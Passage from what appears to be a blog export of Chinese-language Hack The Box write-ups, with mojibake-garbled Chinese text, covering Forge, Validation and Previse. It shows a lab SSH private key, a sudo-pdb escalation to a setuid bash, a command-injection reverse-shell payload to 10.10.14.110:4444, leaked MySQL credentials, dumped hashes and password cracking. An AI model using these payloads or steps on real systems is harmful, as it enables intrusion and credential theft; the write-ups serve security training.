KEY-----\n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\nshlLupso7WoS0AAAAKdXNlckBmb3JnZQE=\n-----END OPENSSH PRIVATE KEY-----\n```\næˆåŠŸæ‹¿åˆ°ç§é’¥ï¼Œä¿å­˜åˆ°æœ¬åœ°åä½¿ç”¨ç§é’¥è¿›è¡Œç™»å½•\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# chmod 600 id_rsa                                                                                                                                                                                            1 âš™\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh user@10.10.11.111 -i id_rsa                                                                                                                                                                             1 âš™\nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 27 Sep 2021 03:26:19 AM UTC\n\n  System load:  0.0               Processes:             220\n  Usage of /:   45.0% of 6.82GB   Users logged in:       0\n  Memory usage: 30%               IPv4 address for eth0: 10.10.11.111\n  Swap usage:   0%\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Sep 26 21:31:23 2021 from 10.10.14.120\n-bash-5.0$ whoami&&id\nuser\nuid=1000(user) gid=1000(user) groups=1000(user)\n```\nç™»å…¥æˆåŠŸ\n\n```Plain Text\n-bash-5.0$ ls\nsnap  user.txt\n-bash-5.0$ cat user.txt\n7e72b4a44d946d578baa60ad23b0482f\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶\n\n## æƒé™æå‡\né¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹sudo -l\n\n```Plain Text\n-bash-5.0$ sudo -l\nMatching Defaults entries for user on forge:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser user may run the following commands on forge:\n    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py\n```\nè¿™é‡Œçš„æ„æ€æ˜¯`/usr/bin/python3`å¯ä»¥ä½¿ç”¨rootæƒé™æ‰§è¡Œ`/opt/remote-manage.py`è„šæœ¬\n\nå’±ä»¬å»çœ‹ä¸€ä¸‹è¿™ä¸ªè„šæœ¬\n\n```Plain Text\n-bash-5.0$ cat /opt/remote-manage.py\n#!/usr/bin/env python3\nimport socket\nimport random\nimport subprocess\nimport pdb\n\nport = random.randint(1025, 65535)\n\ntry:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind(('127.0.0.1', port))\n    sock.listen(1)\n    print(f'Listening on localhost:{port}')\n    (clientsock, addr) = sock.accept()\n    clientsock.send(b'Enter the secret passsword: ')\n    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':\n        clientsock.send(b'Wrong password!\\n')\n    else:\n        clientsock.send(b'Welcome admin!\\n')\n        while True:\n            clientsock.send(b'\\nWhat do you wanna do: \\n')\n            clientsock.send(b'[1] View processes\\n')\n            clientsock.send(b'[2] View free memory\\n')\n            clientsock.send(b'[3] View listening sockets\\n')\n            clientsock.send(b'[4] Quit\\n')\n            option = int(clientsock.recv(1024).strip())\n            if option == 1:\n                clientsock.send(subprocess.getoutput('ps aux').encode())\n            elif option == 2:\n                clientsock.send(subprocess.getoutput('df').encode())\n            elif option == 3:\n                clientsock.send(subprocess.getoutput('ss -lnt').encode())\n            elif option == 4:\n                clientsock.send(b'Bye\\n')\n                break\nexcept Exception as e:\n    print(e)\n    pdb.post_mortem(e.__traceback__)\nfinally:\n    quit()\n```\nè¿™ä¸ªè„šæœ¬çš„æ„æ€æ˜¯è¿è¡Œè„šæœ¬åä¼šå¼€å¯ä¸€ä¸ªç«¯å£ï¼Œè¿æ¥ç€ä¸€ä¸ªç«¯å£è¾“å…¥é€‰é¡¹ï¼Œå¼‚å¸¸çŠ¶æ€æ—¶ä¼šè¿›å…¥pdbï¼Œä»è€Œå¯¼è‡´æ‰§è¡Œä»»æ„pythonä»£ç \n\né‚£ä¹ˆåŸç†æœ‰äº†ï¼Œè¯´å¹²å°±å¹²\n\né‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰“å¼€ä¸¤ä¸ªçª—å£ï¼Œä¸€ä¸ªç”¨äºæ‰§è¡Œè„šæœ¬ï¼Œä¸€ä¸ªç”¨äºè¿æ¥ç«¯å£\n\n### Server\n```Plain Text\n-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py\nListening on localhost:34260\n```\n### Client\n```Plain Text\n-bash-5.0$ nc localhost 34260\nEnter the secret passsword: secretadminpassword\nWelcome admin!\n\nWhat do you wanna do:\n[1] View processes\n[2] View free memory\n[3] View listening sockets\n[4] Quit\n'\n```\nå¯†ç åœ¨è„šæœ¬ä¸­ï¼Œç™»å½•åè¾“å…¥ä¸€ä¸ªé¡¿å·å³å¯æŠ¥é”™\n\n### ææƒåæ“ä½œ\n```Plain Text\n-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py\nListening on localhost:34260\ninvalid literal for int() with base 10: b\"'\"\n> /opt/remote-manage.py(27)<module>()\n-> option = int(clientsock.recv(1024).strip())\n(Pdb) import os\n(Pdb) os.system(\"ls /root\")\nclean-uploads.sh  root.txt  snap\n0\n(Pdb) os.system(\"chmod +s /bin/bash\")\n0\n(Pdb) exit()\n-bash-5.0$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash\n-bash-5.0$ /bin/bash -p\nbash-5.0# whomai&&id\nbash: whomai: command not found\nbash-5.0# whoami&&id\nroot\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)\nbash-5.0# cd /root\nbash-5.0# ls\nclean-uploads.sh  root.txt  snap\nbash-5.0# cat root.txt\n67a501971344b12bade28d6a75e98cbd\n```\næŠ¥é”™åï¼Œä½¿ç”¨pythonå¯¼å…¥os.systemæ¨¡å—ï¼Œç„¶åå³å¯æ‰§è¡Œsystemæƒé™\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Validation - Hackthebox","url":"/2021/09/27/Hackthebox/Easy/Hackthebox-Validation/","content":"\n# Hackthebox - Validation\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Validation/image1.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Validation/image2.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV 10.10.11.116\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 04:02 EDT\nNmap scan report for 10.10.11.116\nHost is up (0.35s latency).\nNot shown: 992 closed ports\nPORT     STATE    SERVICE       VERSION\n22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)\n|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)\n|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)\n80/tcp   open     http          Apache httpd 2.4.48 ((Debian))\n|_http-server-header: Apache/2.4.48 (Debian)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n5000/tcp filtered upnp\n5001/tcp filtered commplex-link\n5002/tcp filtered rfe\n5003/tcp filtered filemaker\n5004/tcp filtered avt-profile-1\n8080/tcp open     http          nginx\n|_http-title: 502 Bad Gateway\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=9/23%OT=22%CT=1%CU=39467%PV=Y%DS=2%DC=T%G=Y%TM=614C34A\nOS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O\nOS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT       ADDRESS\n1   364.74 ms 10.10.14.1\n2   364.80 ms 10.10.11.116\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.02 seconds\n```","tags":["Hackthebox"]},{"title":"Previse - Hackthebox","url":"/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/","content":"\n# Hackthebox - Previse\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Previse/image1.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Previse/image2.png)\n\n## ä¿¡æ¯æœé›†\nä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV -p- 10.10.11.104\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 22:27 CST\nNmap scan report for 10.10.11.104\nHost is up (0.25s latency).\nNot shown: 65461 closed ports, 72 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)\n|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)\n|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n| http-title: Previse Login\n|_Requested resource was login.php\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=8/8%OT=22%CT=1%CU=38368%PV=Y%DS=2%DC=T%G=Y%TM=610FF0E8\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11\nOS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nTRACEROUTE (using port 554/tcp)\nHOP RTT       ADDRESS\n1   249.39 ms 10.10.14.1\n2   249.51 ms 10.10.11.104\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1810.62 seconds\n```\nå’±ä»¬è¿›80ç«¯å£çœ‹ä¸€ä¸‹HTTPæœåŠ¡çš„å†…å®¹\n\n![](Hackthebox-Previse/image3.png)\n\nè¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ç®¡ç†æœåŠ¡å™¨ï¼Œæˆ‘æµ‹è¯•äº†ä¸€ä¸‹ç®€å•çš„å¼±å£ä»¤æ— æœï¼Œå’±ä»¬å…ˆfuzzä¸€ä¸‹å§\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 -e php,html,txt -mc 200,302,301 -u http://10.10.11.104/FUZZ\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.104/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt\n :: Extensions       : php html txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 100\n :: Matcher          : Response status: 200,302,301\n________________________________________________\n\nlogin.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]\nindex.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]\nindex.html              [Status: 200, Size: 663, Words: 24, Lines: 23]\ndownload.php            [Status: 302, Size: 0, Words: 1, Lines: 1]\nconfig.php              [Status: 200, Size: 0, Words: 1, Lines: 1]\nfooter.php              [Status: 200, Size: 217, Words: 10, Lines: 6]\nheader.php              [Status: 200, Size: 980, Words: 183, Lines: 21]\nfavicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10]\nlogout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]\n.                       [Status: 302, Size: 2801, Words: 737, Lines: 72]\nstatus.php              [Status: 302, Size: 2968, Words: 749, Lines: 75]\nnav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]\nindex.html              [Status: 200, Size: 663, Words: 24, Lines: 23]\nindex.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]\naccounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94]\nfiles.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]\nlogin.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]\nfiles.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]\n:: Progress: [148168/148168] :: Job [1/1] :: 391 req/sec :: Duration: [0:06:55] :: Errors: 4 ::\n```\nç›´æ¥è®¿é—®äº†éƒ¨åˆ†é¡µé¢ï¼Œéƒ½ä¼šè·³è½¬åˆ°`index.php`é¡µé¢ï¼Œä½¿ç”¨curlè®¿é—®è¯•è¯•\n\n```Plain Text\ncurl http://10.10.11.104/files.php\n\n<td><a href='download.php?file=32'><button class=\"uk-button uk-button-text\">siteBackup.zip</button></a></td>\n```\nè¿™æ ·çœ‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›ç‰¹æ®Šçš„æŠ€å·§æ¥è®¿é—®éƒ¨åˆ†é¡µé¢\n\nè®¿é—®\n\n```Plain Text\n/accounts.php\n```\nä¼šè·³è½¬åˆ°\n\n```Plain Text\n/index.php\n```\nï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨burpæŠ“åŒ…\n\n![](Hackthebox-Previse/image4.png)\n\n![](Hackthebox-Previse/image5.png)\n\næŠ“åŒ…åç‚¹å‡» Do interrcept > Response to this request æ¥è¿›è¡Œæ›´æ”¹çŠ¶æ€ç \n\n![](Hackthebox-Previse/image6.png)\n\nå°†æ¡†é€‰èµ·æ¥çš„éƒ¨åˆ†ä¿®æ”¹ä¸º\n\n```Plain Text\nHTTP/1.1 200\n```\nç„¶åæ”¾åŒ…\n\n![](Hackthebox-Previse/image7.png)\n\næˆåŠŸè¿›å…¥æ·»åŠ æ–°ç”¨æˆ·çš„é¡µé¢\n\næ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·\n\nåˆ›å»ºå¥½ä»¥åï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°\n\n```Plain Text\nindex.php\n```\né¡µé¢ï¼Œç„¶åå»ç™»å½•\n\n![](Hackthebox-Previse/image8.png)\n\nç™»å…¥ååœ¨\n\n```Plain Text\nFILES\n```\né¡µé¢ä¸‹æœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹å’Œä¸€ä¸ªæ–‡ä»¶\n\n```Plain Text\nSITEBACKUP.ZIP\n```\nï¼Œå…ˆä¸‹è½½ä¸‹æ¥çœ‹çœ‹ ### config.php\n\n```Plain Text\n<?php\n\nfunction connectDB(){\n    $host = 'localhost';\n    $user = 'root';\n    $passwd = 'mySQL_p@ssw0rd!:)';\n    $db = 'previse';\n    $mycon = new mysqli($host, $user, $passwd, $db);\n    return $mycon;\n}\n\n?>\n```\nå¾—åˆ°äº†mysqlçš„è´¦å·å¯†ç  ### logs.php\n\n```Plain Text\n<?php\nsession_start();\nif (!isset($_SESSION['user'])) {\n    header('Location: login.php');\n    exit;\n}\n?>\n\n<?php\nif (!$_SERVER['REQUEST_METHOD'] == 'POST') {\n    header('Location: login.php');\n    exit;\n}\n\n/////////////////////////////////////////////////////////////////////////////////////\n//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//\n/////////////////////////////////////////////////////////////////////////////////////\n\n$output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\");\necho $output;\n\n$filepath = \"/var/www/out.log\";\n$filename = \"out.log\";\n\nif(file_exists($filepath)) {\n    header('Content-Description: File Transfer');\n    header('Content-Type: application/octet-stream');\n    header('Content-Disposition: attachment; filename=\"'.basename($filepath).'\"');\n    header('Expires: 0');\n    header('Cache-Control: must-revalidate');\n    header('Pragma: public');\n    header('Content-Length: ' . filesize($filepath));\n    ob_clean(); // Discard data in the output buffer\n    flush(); // Flush system headers\n    readfile($filepath);\n    die();\n} else {\n    http_response_code(404);\n    die();\n}\n?>\n```\nä»ä¸Šè¿°ä»£ç å®¡è®¡å‘ç°ï¼Œè¿™å°é¶æœºçš„ç¨‹åºä½¿ç”¨äº†pythonè¿›è¡Œç¼–å†™ï¼Œè€Œä¸æ˜¯PHPï¼Œä»ä»£ç çœ‹èµ·æ¥ï¼Œè¿™å¾ˆå®¹æ˜“è¢«å‘½ä»¤æ³¨å…¥ ## æ¼æ´åˆ©ç”¨\n\n![](Hackthebox-Previse/image9.png)\n\nç‚¹å‡» MANAGEMENT MENU > LOG DATA > SUBMITä½¿ç”¨burpæŠ“åŒ…\n\n![](Hackthebox-Previse/image10.png)\n\n```Plain Text\ndelim=comma;python3+-c+'import+os,pty,socket%3bs%3dsocket.socket()%3bs.connect((\"10.10.14.110\",4444)) %3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn(\"/bin/bash\")'\n```\nä½¿ç”¨ncç›‘å¬ç«¯å£ï¼Œå³å¯getshell\n\n```Plain Text\n(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.110] from (UNKNOWN) [10.10.11.104] 56380\nbash-4.4$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\nç™»å½•mysql\n\n```Plain Text\nbash-4.4$ mysql -u root -p\nmysql -u root -p\nEnter password: mySQL_p@ssw0rd!:)\n\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| previse            |\n| sys                |\n+--------------------+\n\nuse previse;\nshow tables;\n+-------------------+\n| Tables_in_previse |\n+-------------------+\n| accounts          |\n| files             |\n+-------------------+\n\nselect * from accounts;\n+----+-----------+------------------------------------+---------------------+\n| id | username  | password                           | created_at          |\n+----+-----------+------------------------------------+---------------------+\n|  1 | m4lwhere  | $1$ğŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.   | 2021-05-27 18:18:36 |\n|  2 | robin     | $1$ğŸ§‚llol$gBt8as2nJZA5K1YqzaH9Z/   | 2021-08-08 12:38:45 |\n|  4 | caratortu | $1$ğŸ§‚llol$04L/OghOADV.ufho3gKfY.   | 2021-08-08 13:23:42 |\n|  5 | bobby     | $1$ğŸ§‚llol$SyqVySL69GZ.tBbiicFiT/   | 2021-08-08 14:02:50 |\n|  6 | lucifiel  | $1$ğŸ§‚llol$K9wrU9maYCFrqr482bGkS/   | 2021-08-08 17:49:18 |\n|  7 | 0xrf1606  | $1$ğŸ§‚llol$rObjMowMWOzqMlAz8ZsBc1   | 2021-08-08 18:02:45 |\n+----+-----------+------------------------------------+---------------------+\n```\né€šè¿‡æŸ¥çœ‹homeç›®å½•ï¼Œå‘ç°`m4lwhere`è¿™ä¸ªç”¨æˆ·æ˜¯æˆ‘ä»¬éœ€è¦çš„ç”¨æˆ·(å…¶ä»–ç”¨æˆ·éƒ½æ˜¯å…¶ä»–æ­£åœ¨åšè¿™å°é¶æœºçš„äººåˆ›å»ºçš„ï¼ŒåŸºäºHTBçš„è§„åˆ™ï¼Œå’±ä»¬ä¸è¦å½±å“åˆ°å…¶ä»–äºº)ï¼Œå’±ä»¬æŠŠå®ƒçš„hashæ‹¿å»ä½¿ç”¨hashcatæˆ–è€…johnç ´è§£ ### john\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nilovecody112235! (?)\n1g 0:00:20:20 DONE (2021-08-09 02:51) 0.000819g/s 6073p/s 6073c/s 6073C/s ilovecody31..ilovecody..\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# john --show hash\n?:ilovecody112235!\n\n1 password hash cracked, 0 left\n\n```\n### hashcat\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# hashcat -a 0 -m 500 hash --wordlist /usr/share/wordlists/rockyou.txt -o 123                                                                                                                             255 â¨¯\nhashcat (v6.1.1) starting...\n\nOpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n=============================================================================================================================\n* Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 2868/2932 MB (1024 MB allocatable), 2MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers applied:\n* Zero-Byte\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nUsing pure kernels enables cracking longer passwords but for the price of drastically reduced performance.\nIf you want to switch to optimized backend kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\nHost memory required for this attack: 64 